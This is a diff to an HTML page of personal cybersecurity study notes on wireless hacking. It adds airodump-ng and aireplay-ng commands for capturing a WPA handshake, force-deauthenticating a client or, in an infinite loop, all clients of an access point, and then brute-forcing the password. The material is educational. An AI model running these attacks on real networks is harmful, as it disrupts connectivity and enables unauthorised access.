@@ -208,11 +208,25 @@
 </div>
 </div>
 <div class="section" id="capture-packets-in-the-air">
-<h2>Capture packets in the air<a class="headerlink" href="#capture-packets-in-the-air" title="Permalink to this headline">¶</a></h2>
-<p>To capture <a class="reference external" href="https://ricco386.github.io/CYBER501x-Cybersecurity-Fundamentals/html/Unit_4.html#unit4-packets-routing" title="(in RITx: CYBER501x Cybersecurity Fundamentals - Personal study notes)"><span class="xref std std-ref">packets</span></a> in the air we use <a class="reference external" href="https://www.aircrack-ng.org/doku.php?id=airodump-ng">Airodump-ng</a>. To see all accessible routers just run command:</p>
+<span id="wireless-hacking-capture-air-traffic"></span><h2>Capture packets in the air<a class="headerlink" href="#capture-packets-in-the-air" title="Permalink to this headline">¶</a></h2>
+<p>To capture <a class="reference external" href="https://ricco386.github.io/CYBER501x-Cybersecurity-Fundamentals/html/Unit_4.html#unit4-packets-routing" title="(in RITx: CYBER501x Cybersecurity Fundamentals - Personal study notes)"><span class="xref std std-ref">packets</span></a> in the air we use <a class="reference external" href="https://www.aircrack-ng.org/doku.php?id=airodump-ng">airodump-ng</a>. To see all accessible APs just run command:</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">airodump</span><span class="o">-</span><span class="n">ng</span> <span class="n">wlp6s0mon</span>
 </pre></div>
 </div>
+<p>Scan all trafic on AP with SSID <a class="reference external" href="https://ricco386.github.io/CYBER501x-Cybersecurity-Fundamentals/html/Unit_4.html#unit4-mac" title="(in RITx: CYBER501x Cybersecurity Fundamentals - Personal study notes)"><span>MAC Address</span></a> XX:XX:XX:XX:XX:XX on chanel 11 and store the output to SCAN_name via interface wlp6s0mon.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">airodump</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="n">c</span> <span class="mi">11</span> <span class="o">-</span><span class="n">w</span> <span class="n">SCAN_name</span> <span class="o">--</span><span class="n">bssid</span> <span class="n">XX</span><span class="p">:</span><span class="n">XX</span><span class="p">:</span><span class="n">XX</span><span class="p">:</span><span class="n">XX</span><span class="p">:</span><span class="n">XX</span><span class="p">:</span><span class="n">XX</span> <span class="n">wlp6s0mon</span>
+</pre></div>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>We are trying to capture WPA 4-way handshake and perform a WPA bruteforce attack on the password.</p>
+</div>
+<p>To capture WPA handshake attacker might wait for one, or attacker can speed thing out and deauthenticate client. A simple deauthentication attack will force a victim to reauthenticate. The attacker can than sniff the WPA 4-way handshake and perform a WPA bruteforce attack on the password.</p>
+<p>To do so we use <a class="reference external" href="https://www.aircrack-ng.org/doku.php?id=aireplay-ng">aireplay-ng</a>. Send deauthentication request to particular client run command:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="mi">0</span> <span class="mi">0</span> <span class="o">-</span><span class="n">c</span> <span class="n">YY</span><span class="p">:</span><span class="n">YY</span><span class="p">:</span><span class="n">YY</span><span class="p">:</span><span class="n">YY</span><span class="p">:</span><span class="n">YY</span><span class="p">:</span><span class="n">YY</span> <span class="o">-</span><span class="n">a</span> <span class="n">XX</span><span class="p">:</span><span class="n">XX</span><span class="p">:</span><span class="n">XX</span><span class="p">:</span><span class="n">XX</span><span class="p">:</span><span class="n">XX</span><span class="p">:</span><span class="n">XX</span> <span class="n">wlp6s0mon</span>
+</pre></div>
+</div>
+<p>where <cite>XX:XX:XX:XX:XX:XX</cite> is AP <a class="reference external" href="https://ricco386.github.io/CYBER501x-Cybersecurity-Fundamentals/html/Unit_4.html#unit4-mac" title="(in RITx: CYBER501x Cybersecurity Fundamentals - Personal study notes)"><span>MAC Address</span></a> and <cite>YY:YY:YY:YY:YY:YY</cite> is <a class="reference external" href="https://ricco386.github.io/CYBER501x-Cybersecurity-Fundamentals/html/Unit_4.html#unit4-mac" title="(in RITx: CYBER501x Cybersecurity Fundamentals - Personal study notes)"><span>MAC Address</span></a> of client we want to deauthenticate. To perform a DDOS attack on a network just dont specify the client. This way we deauthenticate all clients of the AP. Parameter <cite>-0 0</cite> means it will run deauthentication in an infinite loop.</p>
 </div>
 </div>
 
